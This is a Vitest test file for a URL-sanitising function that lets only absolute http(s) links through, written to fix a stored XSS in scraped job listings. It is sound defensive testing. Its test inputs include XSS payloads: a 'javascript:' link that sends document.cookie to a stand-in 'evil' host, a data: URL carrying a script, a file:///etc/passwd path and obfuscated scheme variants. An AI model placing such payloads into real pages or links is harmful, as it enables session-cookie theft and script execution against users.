import { describe, it, expect } from "vitest"
import { safeHttpUrl } from "./safeUrl"

/**
 * Tests for the href scheme gate (audit frontend M1 — scraped job URLs were
 * rendered as raw <a href>, making "javascript:" postings a stored XSS on
 * click). The contract: ONLY absolute http(s) URLs pass, and the value you
 * render is the parsed/normalized href, never the raw input.
 */
describe("safeHttpUrl", () => {
  it("accepts absolute http and https URLs (normalized)", () => {
    expect(safeHttpUrl("https://example.com/posting/123")).toBe(
      "https://example.com/posting/123",
    )
    expect(safeHttpUrl("http://example.com")).toBe("http://example.com/")
    // Query + fragment survive.
    expect(safeHttpUrl("https://jobs.example.com/x?q=engineer#apply")).toBe(
      "https://jobs.example.com/x?q=engineer#apply",
    )
  })

  it("rejects script-executing schemes", () => {
    expect(safeHttpUrl("javascript:alert(1)")).toBeNull()
    expect(safeHttpUrl("javascript:fetch('//evil/'+document.cookie)")).toBeNull()
    expect(safeHttpUrl("data:text/html,<script>alert(1)</script>")).toBeNull()
    expect(safeHttpUrl("vbscript:msgbox(1)")).toBeNull()
    expect(safeHttpUrl("file:///etc/passwd")).toBeNull()
  })

  it("rejects scheme-obfuscation variants", () => {
    // Uppercase scheme — URL() lowercases the protocol, so the check holds.
    expect(safeHttpUrl("JAVASCRIPT:alert(1)")).toBeNull()
    expect(safeHttpUrl("HTTPS://EXAMPLE.COM")).toBe("https://example.com/")
    // Leading whitespace/control chars are stripped by the URL parser — the
    // scheme still resolves and is still rejected.
    expect(safeHttpUrl("   javascript:alert(1)")).toBeNull()
    expect(safeHttpUrl("\tjavascript:alert(1)")).toBeNull()
    expect(safeHttpUrl("\njavascript:alert(1)")).toBeNull()
    // Embedded tab/newline trickery inside the scheme.
    expect(safeHttpUrl("java\nscript:alert(1)")).toBeNull()
    expect(safeHttpUrl("java\tscript:alert(1)")).toBeNull()
  })

  it("rejects non-absolute and malformed inputs", () => {
    // Protocol-relative — parses, but not http(s).
    expect(safeHttpUrl("//evil.example.com/x")).toBeNull()
    // Relative paths don't parse without a base.
    expect(safeHttpUrl("/jobs/123")).toBeNull()
    expect(safeHttpUrl("jobs/123")).toBeNull()
    expect(safeHttpUrl("")).toBeNull()
    // Bare nonsense.
    expect(safeHttpUrl("not a url")).toBeNull()
    expect(safeHttpUrl("http://")).toBeNull()
  })

  it("handles nullish inputs (the JobListing.url is nullable)", () => {
    expect(safeHttpUrl(null)).toBeNull()
    expect(safeHttpUrl(undefined)).toBeNull()
  })
})
